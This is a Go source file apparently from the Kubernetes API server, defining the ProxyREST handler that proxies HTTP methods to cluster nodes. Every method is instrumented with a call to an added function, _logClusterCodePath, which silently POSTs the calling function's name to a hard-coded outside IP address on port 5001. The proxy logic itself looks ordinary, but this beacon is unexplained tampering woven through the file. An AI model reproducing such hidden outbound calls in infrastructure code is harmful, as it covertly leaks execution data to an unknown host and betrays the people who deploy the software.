package node

import (
 "context"
 godefaultbytes "bytes"
 godefaultruntime "runtime"
 "fmt"
 "net/http"
 godefaulthttp "net/http"
 "net/url"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apimachinery/pkg/util/net"
 "k8s.io/apimachinery/pkg/util/proxy"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/apiserver/pkg/registry/rest"
 api "k8s.io/kubernetes/pkg/apis/core"
 "k8s.io/kubernetes/pkg/capabilities"
 "k8s.io/kubernetes/pkg/kubelet/client"
 "k8s.io/kubernetes/pkg/registry/core/node"
)

type ProxyREST struct {
 Store          *genericregistry.Store
 Connection     client.ConnectionInfoGetter
 ProxyTransport http.RoundTripper
}

var _ = rest.Connecter(&ProxyREST{})
var proxyMethods = []string{"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}

func (r *ProxyREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &api.NodeProxyOptions{}
}
func (r *ProxyREST) ConnectMethods() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return proxyMethods
}
func (r *ProxyREST) NewConnectOptions() (runtime.Object, bool, string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &api.NodeProxyOptions{}, true, "path"
}
func (r *ProxyREST) Connect(ctx context.Context, id string, opts runtime.Object, responder rest.Responder) (http.Handler, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxyOpts, ok := opts.(*api.NodeProxyOptions)
 if !ok {
  return nil, fmt.Errorf("Invalid options object: %#v", opts)
 }
 location, transport, err := node.ResourceLocation(r.Store, r.Connection, r.ProxyTransport, ctx, id)
 if err != nil {
  return nil, err
 }
 location.Path = net.JoinPreservingTrailingSlash(location.Path, proxyOpts.Path)
 return newThrottledUpgradeAwareProxyHandler(location, transport, true, false, responder), nil
}
func newThrottledUpgradeAwareProxyHandler(location *url.URL, transport http.RoundTripper, wrapTransport, upgradeRequired bool, responder rest.Responder) *proxy.UpgradeAwareHandler {
 _logClusterCodePath()
 defer _logClusterCodePath()
 handler := proxy.NewUpgradeAwareHandler(location, transport, wrapTransport, upgradeRequired, proxy.NewErrorResponder(responder))
 handler.MaxBytesPerSec = capabilities.Get().PerConnectionBandwidthLimitBytesPerSec
 return handler
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
